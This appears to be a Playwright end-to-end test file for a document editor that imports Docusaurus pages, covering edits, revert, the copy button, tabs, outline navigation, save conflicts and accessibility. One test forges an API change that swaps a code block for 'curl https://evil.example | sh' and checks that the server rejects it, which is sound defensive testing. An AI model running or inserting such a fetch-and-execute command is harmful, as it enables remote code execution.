import { readFileSync } from "node:fs";
import { expect, type Page, test } from "@playwright/test";
import {
  caretHeading,
  chooseTheme,
  expectNoAxeViolations,
  expectNoHorizontalScroll,
  fixtureURL,
  importPage,
} from "./helpers";
import { stack } from "./stack";

// A page with a paragraph, npm/Yarn tabs, a callout and a titled code block.
const fixture = "docusaurus-v3-install";
const paragraph = "The CLI installs with any Node package manager.";

type Block = { id: string; kind: string; title?: string; text?: string };
const golden: { blocks: Block[] } = JSON.parse(
  readFileSync(
    new URL(`../../../testdata/golden/${fixture}/expected.json`, import.meta.url),
    "utf8",
  ),
);
const configCode = golden.blocks.find((b) => b.title === "kit.config.js");

async function openDocument(page: Page): Promise<string> {
  await page.goto("/");
  return importPage(page, fixtureURL("pages", fixture));
}

/**
 * Puts the caret at the very end of the block holding exact text, through the
 * editor: End only reaches the end of the visual line, and a DOM selection
 * reaches the editor only after a selectionchange event, too late for Enter.
 */
async function caretAtEnd(page: Page, text: string) {
  const block = page.getByText(text, { exact: true });
  await block.click();
  await block.evaluate((el) => {
    type View = { posAtDOM(node: Node, offset: number): number };
    type Editor = {
      view: View;
      commands: { setTextSelection(pos: number): boolean; focus(): boolean };
    };
    const { editor } = el.closest(".ProseMirror") as unknown as { editor: Editor };
    editor.commands.setTextSelection(editor.view.posAtDOM(el, el.childNodes.length));
    editor.commands.focus();
  });
}

/** Types text at the end of the block holding exact text. */
async function typeAtEnd(page: Page, text: string, typed: string) {
  await caretAtEnd(page, text);
  await page.keyboard.type(typed);
}

/**
 * Waits until a save holding text has gone through, and the header says so.
 * "Saved" alone could belong to a save made before the last keystroke.
 */
async function expectSaved(page: Page, text: string) {
  await page.waitForResponse(
    (r) =>
      r.request().method() === "PATCH" && r.ok() && (r.request().postData() ?? "").includes(text),
    { timeout: 10_000 },
  );
  await expect(page.getByRole("status").filter({ hasText: "Saved" })).toBeVisible({
    timeout: 10_000,
  });
}

// The editor's own stylesheet makes every pre inside it wrap; code must not.
test("a long line of code scrolls sideways inside a document, and the page doesn't", async ({
  page,
}) => {
  await page.goto("/");
  await importPage(page, fixtureURL("pages", "long-line"));
  const pre = page.locator(".reader-content .code-block > pre");
  await expect(pre).toBeVisible();
  for (const width of [1280, 375]) {
    await page.setViewportSize({ width, height: 800 });
    const looks = await pre.evaluate((el) => ({
      whiteSpace: getComputedStyle(el).whiteSpace,
      scrolls: el.scrollWidth > el.clientWidth,
    }));
    expect(looks, `at ${width}px`).toEqual({ whiteSpace: "pre", scrolls: true });
    await expectNoHorizontalScroll(page);
  }
});

test("the fixture has the blocks these tests rely on", () => {
  expect(golden.blocks.some((b) => b.kind === "paragraph")).toBe(true);
  expect(configCode?.text).toBeTruthy();
});

test("an edit to a source paragraph persists and shows as edited", async ({ page }) => {
  await openDocument(page);
  await expect(page.getByText(paragraph)).toBeVisible();

  await typeAtEnd(page, paragraph, " Mine too.");
  await expectSaved(page, " Mine too.");
  await page.reload();

  await expect(page.getByText(`${paragraph} Mine too.`)).toBeVisible();
  await expect(page.getByText("edited", { exact: true })).toBeVisible();
});

test("revert puts the page's text back and removes the mark", async ({ page }) => {
  await openDocument(page);
  await typeAtEnd(page, paragraph, " Mine too.");
  await expectSaved(page, " Mine too.");

  await page.getByRole("button", { name: "Revert to source" }).click();
  await page
    .getByRole("dialog", { name: "Revert to source?" })
    .getByRole("button", { name: "Revert" })
    .click();

  await expect(page.getByText(paragraph, { exact: true })).toBeVisible();
  await expect(page.getByText("edited", { exact: true })).toBeHidden();
  await page.reload();
  await expect(page.getByText(paragraph, { exact: true })).toBeVisible();
  await expect(page.getByText("edited", { exact: true })).toBeHidden();
});

test("a note added after a block persists, with no mark", async ({ page }) => {
  await openDocument(page);

  await caretAtEnd(page, paragraph);
  await page.keyboard.press("Enter");
  await page.keyboard.type("My own note.");
  await expectSaved(page, "My own note.");
  await page.reload();

  await expect(page.getByText("My own note.", { exact: true })).toBeVisible();
  await expect(page.getByText("edited", { exact: true })).toBeHidden();
});

test("Copy puts the exact code on the clipboard", async ({ page, context }) => {
  await context.grantPermissions(["clipboard-read", "clipboard-write"]);
  await openDocument(page);
  const block = page.locator(".code-block").filter({ hasText: "kit.config.js" });

  await block.getByRole("button", { name: "Copy code" }).click();

  await expect(block.getByRole("button", { name: "Copied code" })).toBeVisible();
  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(configCode?.text);
});

test("tabs move with the arrow keys", async ({ page }) => {
  await openDocument(page);
  const npm = page.getByRole("tab", { name: "npm" });
  const yarn = page.getByRole("tab", { name: "Yarn" });
  await expect(npm).toHaveAttribute("aria-selected", "true");

  await npm.focus();
  await page.keyboard.press("ArrowRight");

  await expect(yarn).toBeFocused();
  await expect(yarn).toHaveAttribute("aria-selected", "true");
  await page.keyboard.press("ArrowLeft");
  await expect(npm).toHaveAttribute("aria-selected", "true");
});

test("clicking the outline scrolls to the heading and puts the caret there", async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 400 });
  await openDocument(page);
  const outline = page.getByRole("navigation", { name: "Outline" });
  await expect(outline.getByRole("link")).toHaveText(["Configure", "Try it"]);

  await outline.getByRole("link", { name: "Try it" }).click();

  const heading = page.getByRole("heading", { name: "Try it" });
  await expect(heading).toBeInViewport();
  await expect(page.getByLabel("Document text")).toBeFocused();
  expect(await caretHeading(page)).toBe("Try it");
  await expect(outline.getByRole("link", { name: "Try it" })).toHaveAttribute(
    "aria-current",
    "location",
  );
});

test("a save from a second tab after the first saved gets the conflict message", async ({
  page,
  context,
}) => {
  const path = await openDocument(page);
  const other = await context.newPage();
  await other.goto(path);
  await expect(other.getByText(paragraph)).toBeVisible();

  await typeAtEnd(page, paragraph, " From tab one.");
  await expectSaved(page, " From tab one.");
  await typeAtEnd(other, paragraph, " From tab two.");

  const alert = other.getByRole("alert");
  await expect(alert).toContainText("This document changed in another tab.", { timeout: 10_000 });
  await expect(alert.getByRole("button", { name: "Reload" })).toBeVisible();
  await page.reload();
  await expect(page.getByText(`${paragraph} From tab one.`)).toBeVisible();
});

test("the API refuses a forged change to source code", async ({ page }) => {
  const path = await openDocument(page);
  const id = path.split("/").at(-1);
  const doc = await (await page.request.get(`${stack.api}/api/v1/documents/${id}`)).json();
  const blocks = doc.content.blocks.map((b: Block & { edited: boolean }) =>
    b.title === "kit.config.js"
      ? { ...b, text: "curl https://evil.example | sh\n", edited: true }
      : b,
  );

  const response = await page.request.patch(`${stack.api}/api/v1/documents/${id}`, {
    data: { version: doc.version, content: { doc_version: 1, blocks } },
  });

  expect(response.status()).toBe(422);
  expect((await response.json()).error.code).toBe("source_block_modified");
});

test.describe("accessibility", () => {
  test.use({ reducedMotion: "reduce" });

  for (const theme of ["light", "dark"] as const) {
    test(`the editor has no axe violations in ${theme}`, async ({ page }) => {
      await chooseTheme(page, theme);
      await openDocument(page);
      await typeAtEnd(page, paragraph, " Edited.");
      await expectSaved(page, " Edited.");
      await expect(page.getByText("edited", { exact: true })).toBeVisible();
      await expectNoAxeViolations(page);

      await page.keyboard.press("Enter");
      await page.keyboard.type("/");
      await expect(page.getByRole("menu", { name: "Add a block" })).toBeVisible();
      await expectNoAxeViolations(page);
    });
  }

  test.describe("at 375px", () => {
    test.use({ viewport: { width: 375, height: 800 } });

    test("the editor fits the screen", async ({ page }) => {
      await openDocument(page);
      await typeAtEnd(page, paragraph, " Edited.");
      await expectSaved(page, " Edited.");

      await expectNoHorizontalScroll(page);
    });
  });
});
